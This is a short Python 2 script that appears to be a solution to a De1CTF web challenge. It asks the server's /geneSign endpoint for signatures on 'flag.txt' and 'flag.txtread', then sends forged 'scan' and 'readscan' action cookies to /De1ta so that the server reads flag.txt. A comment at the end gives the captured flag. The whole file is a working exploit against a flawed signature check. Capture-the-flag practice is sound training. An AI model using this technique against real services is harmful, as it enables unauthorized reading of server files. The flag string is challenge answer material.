import requests

param = 'flag.txt'
base_url = 'http://139.180.128.86'

def getSign(param):
    r = requests.get(base_url+'/geneSign?param='+param)
    return r.text

scan_sign = getSign(param)
read_sign = getSign(param+'read')


print scan_sign
print read_sign

cookies = {}
cookies['action'] = 'scan'
cookies['sign'] = scan_sign

r = requests.get(base_url+'/De1ta?param='+param,cookies=cookies)
print r.text

cookies['action'] = 'readscan'
cookies['sign'] = read_sign

r = requests.get(base_url+'/De1ta?param='+param,cookies=cookies)
print r.text

# flag: de1ctf{27782fcffbb7d00309a93bc49b74ca26}
